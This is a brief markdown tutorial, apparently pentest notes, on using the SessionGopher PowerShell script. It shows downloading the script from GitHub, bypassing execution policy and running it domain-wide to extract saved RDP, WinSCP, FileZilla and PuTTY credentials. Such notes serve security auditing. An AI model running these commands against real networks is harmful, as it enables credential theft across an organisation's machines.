### What is SessionGopher?

**SessionGopher** is a powershell script designed to extract **saved credentials**  from remote desktop, WinSCP, FileZilla, PuTTY, and other application. It is primarily used for **post-exploitaion** and **security auditing** to identify stored password in various services.

[SessionFopher Github Repo](https://raw.githubusercontent.com/Arvanaghi/SessionGopher/master/SessionGopher.ps1)

---

### Download and Running Session

```powershell
Invoke-WebRequest -Uri "https://raw.githubusercontent.com/Arvanaghi/SessionGopher/master/SessionGopher.ps1" -OutFile ".\SessionGopher.ps1"
```

#### import the Module

```powershell
Import-Module .\SessionGopher.ps1
```

If execution policies block script execution bypass them using:

```powershell
Set-ExecutionPolicy -Scope Process -ExecutionPolicy Bypass
```
OR

```powershell
powershell -nop -ep bypass
```
---

### Extracting Passwords from Service

#### 1. Extract Credentials from All Machines in the Domain

```powershell
Invoke-SessionGopher -AllDomain -o
```

The ``-o`` Flag outputs the results to a file

#### 2. Extract Credentials Using specific Domain Credentials

if authentication is required, specify the username and password

```powershell
Invoke-SessionGopher -AllDomain -u domain.com\DevNull -p Secret@123
```

